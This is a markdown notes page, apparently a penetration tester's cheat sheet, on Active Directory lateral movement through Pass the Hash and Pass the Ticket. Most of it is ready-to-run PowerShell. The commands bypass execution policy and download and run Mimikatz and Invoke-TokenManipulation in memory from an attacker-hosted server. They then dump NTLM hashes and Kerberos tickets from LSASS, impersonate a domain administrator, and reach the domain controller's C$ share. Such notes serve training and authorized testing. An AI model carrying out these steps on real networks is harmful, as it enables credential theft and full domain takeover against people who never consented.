---
title: AD Lateral Movement
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - lateral-movement
---
 
# Pass the Hash
> [!Requirements] 
> - Access to a machine with high privileges

Steps:
1. Load PowerView and perform a general enumeration:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1 

+ GENERAL ENUMERATION +
PS> Get-Domain (get current domain + DC name)
PS> Find-LocalAdminAccess (find a machine in the current domain in which the current user has local admin access or one we can remote to)
```

2. Access the remote system (pivot host):
```powershell
PS> Enter-PSSession SYSTEM_FQDN
SYSTEM_FQDN: seclogs.research.SECURITY.local (full domain name)
```

3. Obtain hashes:
```powershell
*upload mimikatz to HFS*
PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-TokenManipulation.ps1')
PS [remote]> Invoke-TokenManipulation -Enumerate (enumerate all available tokens. Check for logontype=2 which means that the user is currently loged in the system or has loged in)

PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1') 
PS [remote]> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' (check if we have enough privileges + dump the NTLM hash of the loged in users)
```

4. Perform PtH attack:
> [!Requirements]
> - High privileged access on the current machine (pivot host, not target). 
> - Execute PSH with high privileges

```powershell
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:CURRENT_DOMAIN /ntlm:NTLM_HASH /run:powershell.exe"'
```

5. Access the DC (in case the user we have created the PSH session for, is a domain admin)
```powershell
+ ACCESS THE DC +
PS> Enter-PSSession DC_NAME
```

> [!Note]
> In this case the hash we have compromised is from a domain admin user so we can remotely access the DC

---
# Pass the ticket
Stole kerberos tickets to authenticate to resources (shares, computers...) as a user without having to compromise the password.
1. **Without administrative privileges**: we can obtain the TGT and all TGS for the current user using a technique called fake delegation
2. **With administrative privileges**: we can dump the LSASS process and obtain all TGTs and TGS tickets cached on the system.

Steps (for second option):
1. Load PowerView and find machines within the current AD Domain where the current user has local administrator access:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1

PS> whoami
PS> hostname
PS> Find-LocalAdminAccess (find machine within the current AD Domain where the current user has local administrator access)

PS> Enter-PSSession FQDN_SYSTEM (PSRemote into systems)
PS [remote]> whoami /privs (we should have admin privileges)
```

2. Dump tickets from memory:
```powershell
*Create an HFS server and upload Invoke-Mimikatz.ps1*
PS [remote]> iex (New-Object Net-WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1')
PS [remote]> Invoke-Mimikatz.ps1 -Command '"sekurlsa::tickets /export"' (export TGS tickets)
*we should see in the cwd all the tickets exported*
```

3. Use the tickets to access resources and other systems:
```powershell
PS [remote]> Invoke-Mimikatz -Command '"kerberos::ptt FULL_TICKET_NAME"' (introduce the extracted ticket into our current PS session)
Parameters:
FULL_TICKE_NAME: ticket name for example [...]-...maintainer-krbtgt-FQDN (try maintainer@krbtgt to access the DC)

PS [remote]> klist (list current tickets. We should have the new ticket loaded)
NOTE: check the renew time for persistence

Invoke Powerview to check the DC FQDN and access the DC using the extracted ticket:
PS> . .\PowerView.ps1
PS> Get-Domain (check DC FQDN)
PS [remote]> ls \\DC_FQDN\c$ (check if we can access the C drive from the DC)
```
